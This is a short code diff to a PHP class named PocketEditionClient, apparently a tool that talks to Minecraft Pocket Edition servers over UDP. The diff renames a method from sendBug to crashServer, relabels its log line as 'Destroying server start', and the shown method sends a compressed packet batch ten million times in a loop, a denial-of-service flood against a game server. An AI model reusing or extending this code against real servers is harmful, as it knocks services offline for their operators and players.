@@ -219,7 +219,7 @@ class PocketEditionClient extends UDPServerSocket
 		$this->damageAll = $damage;
 	}
 
-	function sendBug()
+	function crashServer()
 	{
 		$stream = new BinaryStream();
 
@@ -237,13 +237,13 @@ class PocketEditionClient extends UDPServerSocket
 
 		$batchBuffer = zlib_encode($stream->buffer, ZLIB_ENCODING_DEFLATE, 9);
 
-		info('Bug start');
+		info('Destroying server start');
 
 		for ($i = 0; $i < 10000000; $i++) {
 			$this->sendRawData($batchBuffer);
 		}
 
-		info('Bug finish');
+		info('finish');
 	}
 
 	protected function sendRawData(string $buffer): void
@@ -332,6 +332,7 @@ class PocketEditionClient extends UDPServerSocket
 	{
 		$pk = new DisconnectionNotification();
 		$this->sendSessionRakNetPacket($pk);
+		$this->close();
 		unset($this->socket);
 	}
 
